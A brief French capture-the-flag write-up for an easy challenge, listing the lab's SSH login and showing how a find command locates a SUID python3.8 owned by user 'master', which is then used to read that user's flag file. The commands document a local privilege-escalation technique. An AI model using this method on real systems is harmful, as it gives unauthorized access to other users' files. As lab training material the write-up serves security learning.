# To B, or ! to B

## Sujet :

> Votre client vous remercie pour votre travail et vous assure qu'il a fait les modifications nécessaires pour améliorer la sécurité de son serveur applicatif.
> 
> Prouvez-lui que ce n'est toujours pas suffisant.
>
> === Connexion SSH ===
> 
> Login : padawan
> 
> Mdp : padawan
> 
> Serveur : toBOrNot2B.phack.fr

Tags : `system` `suid` `easy`

## Solution :
A la vue des tags du challenge, on va rechercher les binaires qui ont le SUID bit pour l'utilisateur master.

```
$ find / -user master -perm -4000 -exec ls -la {} \;
-rwsr-xr-x    1 master   root         14048 Mar 15 12:52 /usr/bin/python3.8
...
```

Donc si on execute `python3.8`, on aura l'EUID (Effective User ID) de l'utilisateur master (101).
Ainsi on peut lire le flag.

```
$ python3.8
>>> open("/home/master/flag.txt", "r").read()
"PHACK{U_4r3_hiM_bu7_h3's_n07_U}\n"
```

`PHACK{U_4r3_hiM_bu7_h3's_n07_U}`